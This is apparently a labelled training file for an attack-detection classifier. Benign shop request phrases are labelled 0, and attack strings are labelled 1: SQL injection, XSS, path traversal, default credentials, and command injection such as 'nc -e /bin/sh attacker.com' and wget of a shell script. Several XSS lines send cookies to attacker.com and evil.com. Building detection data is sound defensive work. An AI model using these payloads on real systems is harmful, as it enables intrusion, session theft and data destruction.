+browse mobile phones req294,0
+<a href='javascript:alert(1)'>click</a>,1
+username=admin&password=letmein,1
+& ipconfig,1
+1' GROUP BY 1--,1
+apply checkout discount at coupon req1160,0
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+1'; WAITFOR DELAY '0:0:5'--,1
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+1'; EXEC xp_cmdshell('whoami')--,1
+website submit for feedback form req1053,0
+filter apply name brand by req719,0
+GET /.htaccess HTTP/1.1,1
+report export data as csv req625,0
+<select onfocus=alert(1) autofocus>,1
+username=admin&password=password,1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+get account profile req340,0
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+; ping -c 4 attacker.com,1
+by brand name apply filter req81,0
+| wget http://attacker.com/shell.sh,1
+add 42 product cart item id req638,0
+password=1' OR '1'='1' /*,1
+username=admin&password=superman,1
+<svg onload=alert(document.domain)>,1
+1' ORDER BY 10--,1
+javascript:alert(document.cookie),1
+; ls -la,1
+& ipconfig,1
+username=admin'/*,1
+1' OR 1=1--,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+download invoice number for order req327,0
+"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
+preference delivery express set to req1113,0
+terms conditions and page view req824,0
+php://filter/convert.base64-encode/resource=config.php,1
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+username=admin&password=superman,1
+price to range 500 100 by req1168,0
+id=2 OR 1=1,1
+view notification settings panel req1019,0
+username=admin&password=admin123,1
+social link share media via product req722,0
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+arabic change language account to req1003,0
+last view order days 30 req809,0
+email subscribe with newsletter to req672,0
+"1 UNION SELECT @@version,NULL--",1
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+with checkout payment credit card req320,0
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+account for billing address req967,0
+& net user hacker Password1 /add,1
+<a href='javascript:alert(1)'>click</a>,1
+repeated authentication failure admin account locked,1
+; cat /etc/shadow,1
+arabic change to language account req375,0
+to add id cart req514,0
+GET /.git/config HTTP/1.1,1
+email reset password req579,0
+username=admin&password=123456,1
+policy view return req213,0
+filter by apply name req788,0
+GET /console HTTP/1.1,1
+<input onfocus=alert(1) autofocus>,1
+email to with newsletter req264,0
+range 100 price req24,0
+GET /server-status HTTP/1.1,1
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+GET /admin/config.php HTTP/1.1,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+username=admin'/*,1
+username=admin&password=password,1
+data csv as export report req911,0
+& ipconfig,1
+../../../etc/shadow,1
+credit payment card req1017,0
+php://filter/convert.base64-encode/resource=config.php,1
+website feedback submit req221,0
+<svg><script>alert(1)</script></svg>,1
+GET /actuator/env HTTP/1.1,1
+& ipconfig,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+"1 UNION SELECT @@version,NULL--",1
+by electronics for category req938,0
+later to wishlist for req97,0
+login with password username req1181,0
+..\..\..\windows\system32\drivers\etc\hosts,1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+<object data=javascript:alert(1)>,1
+invoice number for order download req162,0
+../../.git/config,1
+1' ORDER BY 10--,1
+for view days last req1139,0
+express to delivery preference req549,0
+GET /console HTTP/1.1,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+username=admin&password=qwerty,1
+for shipping address update order req975,0
+recommendations based history on view req155,0
+../../../../proc/self/environ,1
+get user account profile req837,0
+1'; EXEC xp_cmdshell('whoami')--,1
+terms conditions and page view req621,0
+phones browse mobile req827,0
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+<a href='javascript:alert(1)'>click</a>,1
+"; python -c 'import socket,subprocess'",1
+return view policy for product req563,0
+login password and with username req245,0
+product media link share req325,0
+username=admin&password=admin123,1
+learning books machine req997,0
+admin'--,1
+csv export report data as req968,0
+username=admin'/*,1
+; cat /etc/shadow,1
+username=user&password=pass,1
+category mobile phones browse req86,0
+| uname -a,1
+from session logout current req54,0
+& ipconfig,1
+GET /wp-admin HTTP/1.1,1
+"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
+for product return req952,0
+file:///etc/passwd,1
+<object data=javascript:alert(1)>,1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+repeated authentication failure admin account locked,1
+username=admin&password=1234567890,1
+discount apply coupon checkout at req72,0
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+link social via req276,0
+<video src=1 onerror=alert(1)>,1
+../../wp-config.php,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+../../../etc/shadow,1
+/etc/passwd%00,1
+product social link req718,0
+1' ORDER BY 10--,1
+articles latest get req544,0
+php://filter/convert.base64-encode/resource=config.php,1
+....//....//etc/passwd,1
+' HAVING 1=1--,1
+"; python -c 'import socket,subprocess'",1
+username=admin&password=batman,1
+1'; WAITFOR DELAY '0:0:5'--,1
+username=admin&password=1234567890,1
+listing sort newest arrivals by req388,0
+for item store check req1031,0
+GET /web.config HTTP/1.1,1
+GET /.git/config HTTP/1.1,1
+"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
+; whoami,1
+password with login and username req417,0
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+username=admin&password=batman,1
+"1 UNION SELECT @@version,NULL--",1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+email subscribe with to req895,0
+settings notification panel view req275,0
+credit payment card checkout with req179,0
+admin' AND 1=1--,1
+login attempt failed username admin invalid credentials,1
+../.env,1
+product via link media req1140,0
+../../../../var/www/html/config.php,1
+history recommendations view based on req270,0
+to range by results price req901,0
+GET /phpmyadmin HTTP/1.1,1
+locations map store on view req871,0
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+email to with subscribe newsletter req49,0
+' HAVING 1=1--,1
+../../wp-config.php,1
+1' AND SLEEP(5)--,1
+to change arabic account language req61,0
+browse mobile category phones req711,0
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+username=admin'/*,1
+to send seller message support req433,0
+password login with username and req875,0
+and terms conditions req951,0
+days for 30 order last view req494,0
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+admin'--,1
+<video src=1 onerror=alert(1)>,1
+5 review product rate stars req848,0
+username=user&password=pass,1
+checkout at apply req776,0
+brute force attempt on login endpoint from single ip,1
+username=admin&password=letmein,1
+' HAVING 1=1--,1
+& net user hacker Password1 /add,1
+results by filter 100 req441,0
+<body onload=alert('XSS')>,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+card payment credit with checkout req180,0
+category electronics search for by req684,0
+; cat /etc/shadow,1
+username with login and req687,0
+../../../../var/www/html/config.php,1
+results 100 to req395,0
+coupon at checkout apply discount req903,0
+shipping order address for req258,0
+php://filter/convert.base64-encode/resource=config.php,1
+../../../../etc/passwd,1
+locations on view map req787,0
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+id 42 add item req59,0
+apply filter brand name by req114,0
+"1 UNION SELECT @@version,NULL--",1
+item store for check req65,0
+and login password username with req374,0
+order number invoice for download req819,0
+reset link via email password req977,0
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+update order address shipping req1022,0
+GET /.git/config HTTP/1.1,1
+1'; DELETE FROM orders WHERE 1=1--,1
+browse mobile category phones req199,0
+related view section req19,0
+username=test&password=test,1
+for item later to save req214,0
+<script>alert('XSS')</script>,1
+admin'--,1
+..%2F..%2F..%2Fetc%2Fpasswd,1
+username=admin'/*,1
+browse mobile phones category req421,0
+....//....//etc/passwd,1
+`id`,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+../../../etc/shadow,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+../../wp-config.php,1
+days 30 for view order req195,0
+; ping -c 4 attacker.com,1
+<audio src=1 onerror=alert(1)>,1
+id 42 product item cart req885,0
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+GET /crossdomain.xml HTTP/1.1,1
+last for order view 30 days req141,0
+; ls -la,1
+by filter brand name apply req887,0
+track with shipment tracking number req728,0
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+card payment with req628,0
+feed latest articles news get req1119,0
+..%2F..%2F..%2Fetc%2Fpasswd,1
+GET /backup.sql HTTP/1.1,1
+../../../../etc/passwd,1
+view policy for return req317,0
+feedback submit form req689,0
+GET /crossdomain.xml HTTP/1.1,1
+|| nc -e /bin/sh attacker.com 4444,1
+GET /web.config HTTP/1.1,1
+via link social product share media req508,0
+1' OR 1=1--,1
+terms and view page conditions req725,0
+request contact support for req411,0
+password spray attack detected multiple users,1
+with account new register req73,0
+enable factor two authentication req698,0
+credit card payment with checkout req660,0
+42 id add product cart to req1143,0
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+item 42 product req574,0
+1'; WAITFOR DELAY '0:0:5'--,1
+; ping -c 4 attacker.com,1
+specifications two products req992,0
+../../../../var/www/html/config.php,1
+<textarea onfocus=alert(1) autofocus>,1
+at apply discount req338,0
+specifications compare two products req279,0
+<script>alert('XSS')</script>,1
+<details open ontoggle=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+| cat /etc/passwd,1
+../../.git/config,1
+1'; WAITFOR DELAY '0:0:5'--,1
+availability item store check req559,0
+; ls -la,1
+seller message support send req469,0
+email password via link reset req1026,0
+profile picture jpeg req43,0
+via password link req154,0
+1'; EXEC xp_cmdshell('whoami')--,1
+conditions view terms and req796,0
+GET /config.bak HTTP/1.1,1
+| uname -a,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+GET /admin/config.php HTTP/1.1,1
+<body background=javascript:alert(1)>,1
+; whoami,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+../../../../proc/self/environ,1
+../../../etc/shadow,1
+website feedback form for submit req299,0
+GET /api/swagger.json HTTP/1.1,1
+<input onfocus=alert(1) autofocus>,1
+to add item id product req182,0
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+filter apply name by brand req849,0
+feed latest news get articles req1035,0
+jpeg format upload picture profile req675,0
+<img src=x onerror=alert(1)>,1
+username=admin'/*,1
+GET /server-status HTTP/1.1,1
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+machine books about search learning req430,0
+| uname -a,1
+view terms and req313,0
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+picture jpeg format upload profile req496,0
+GET /backup.sql HTTP/1.1,1
+GET /robots.txt scan probe reconnaissance,1
+"1 UNION SELECT @@version,NULL--",1
+<div onmouseover=alert(1)>hover</div>,1
+save wishlist for req889,0
+| uname -a,1
+& ipconfig,1
+; cat /etc/shadow,1
+42 cart item product req273,0
+../../wp-config.php,1
+session current logout from req1195,0
+GET /web.config HTTP/1.1,1
+username=admin&password=1234567890,1
+link via product req1121,0
+for download invoice order req646,0
+products two specifications req981,0
+to 500 by price filter results req178,0
+GET /.git/config HTTP/1.1,1
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+store availability for req391,0
+multiple failed login attempts detected for admin,1
+& net user hacker Password1 /add,1
+website feedback submit for form req751,0
+..%2F..%2F..%2Fetc%2Fpasswd,1
+1' AND SLEEP(5)--,1
+<body background=javascript:alert(1)>,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+; ls -la,1
+username=admin&password=admin123,1
+via link media product social req735,0
+machine books learning about search req1020,0
+' OR 'x'='x,1
+two authentication factor req717,0
+username=admin&password=1234567890,1
+GET /config.bak HTTP/1.1,1
+1' AND SLEEP(5)--,1
+; ping -c 4 attacker.com,1
+| wget http://attacker.com/shell.sh,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+../.env,1
+address update shipping for order req1179,0
+upload profile format jpeg picture req373,0
+; id,1
+account for user dashboard get profile req160,0
+username=root&password=root,1
+<textarea onfocus=alert(1) autofocus>,1
+<audio src=1 onerror=alert(1)>,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+repeated authentication failure admin account locked,1
+' OR 'x'='x,1
+<body onload=alert('XSS')>,1
+panel notification view settings req1011,0
+username=admin&password=admin123,1
+1'; WAITFOR DELAY '0:0:5'--,1
+terms view conditions page and req262,0
+<SCRIPT>alert('XSS')</SCRIPT>,1
+enable two factor authentication req584,0
+shipping for order address update req30,0
+view products section related req826,0
+listing newest arrivals sort req1128,0
+<script>alert('XSS')</script>,1
+../../../etc/shadow,1
+"; python -c 'import socket,subprocess'",1
+<details open ontoggle=alert(1)>,1
+delivery preference express req831,0
+multiple failed login attempts detected for admin,1
+1'; WAITFOR DELAY '0:0:5'--,1
+username=admin&password=password,1
+username=root&password=root,1
+for save to req650,0
+GET /server-status HTTP/1.1,1
+../../wp-config.php,1
+; id,1
+admin' AND 1=1--,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+address shipping update for req842,0
+current logout session from req532,0
+discount coupon checkout req845,0
+1'; DELETE FROM orders WHERE 1=1--,1
+account to language arabic change req281,0
+| wget http://attacker.com/shell.sh,1
+<audio src=1 onerror=alert(1)>,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+<div onmouseover=alert(1)>hover</div>,1
+discount apply checkout coupon at req528,0
+news get latest req453,0
+checkout credit with payment card req643,0
+GET /admin/config.php HTTP/1.1,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+id=2 OR 1=1,1
+about machine search books learning req703,0
+website feedback form for submit req45,0
+<div onmouseover=alert(1)>hover</div>,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+compare specifications two products req235,0
+<body onload=alert('XSS')>,1
+brand apply filter by req286,0
+<ScRiPt>alert(1)</ScRiPt>,1
+../../../etc/shadow,1
+password and with login req1192,0
+mobile phones browse category req954,0
+submit for feedback req843,0
+view page terms and conditions req1162,0
+password=1' OR '1'='1' /*,1
+coupon at checkout discount req284,0
+view days last history order 30 req815,0
+panel view settings notification req764,0
+enable authentication two req109,0
+<SCRIPT>alert('XSS')</SCRIPT>,1
+username=admin&password=admin,1
+/var/log/apache2/access.log,1
+GET /api/swagger.json HTTP/1.1,1
+conditions terms page view and req727,0
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+../../.git/config,1
+current from logout session req427,0
+as export data report csv req702,0
+refund for request support contact req381,0
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+php://filter/convert.base64-encode/resource=config.php,1
+<body onload=alert('XSS')>,1
+brute force attempt on login endpoint from single ip,1
+1'; DELETE FROM orders WHERE 1=1--,1
+enable two factor authentication req444,0
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+and with password login req771,0
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+<video src=1 onerror=alert(1)>,1
+map view locations store on req260,0
+1' GROUP BY 1--,1
+coupon checkout discount at apply req836,0
+"id=1 AND 1=CONVERT(int,@@version)--",1
+' OR 1=1#,1
+multiple failed login attempts detected for admin,1
+username=admin&password=123456,1
+username=admin&password=1234567890,1
+password spray attack detected multiple users,1
+username=admin&password=admin,1
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+return for policy req629,0
+stars review rate req569,0
+express preference set to req131,0
+GET /wp-admin HTTP/1.1,1
+login attempt failed username admin invalid credentials,1
+rate review product 5 stars req95,0
+username=admin&password=admin123,1
+1'; DELETE FROM orders WHERE 1=1--,1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+<ScRiPt>alert(1)</ScRiPt>,1
+../../../../etc/passwd,1
+GET /server-status HTTP/1.1,1
+GET /config.bak HTTP/1.1,1
+admin'--,1
+& ipconfig,1
+../../../../var/www/html/config.php,1
+1; DROP TABLE users--,1
+admin'--,1
+picture jpeg upload req923,0
+1' GROUP BY 1--,1
+admin'--,1
+../../../../var/www/html/config.php,1
+<object data=javascript:alert(1)>,1
+account email with new register req39,0
+|| nc -e /bin/sh attacker.com 4444,1
+1' ORDER BY 10--,1
+factor authentication enable two req525,0
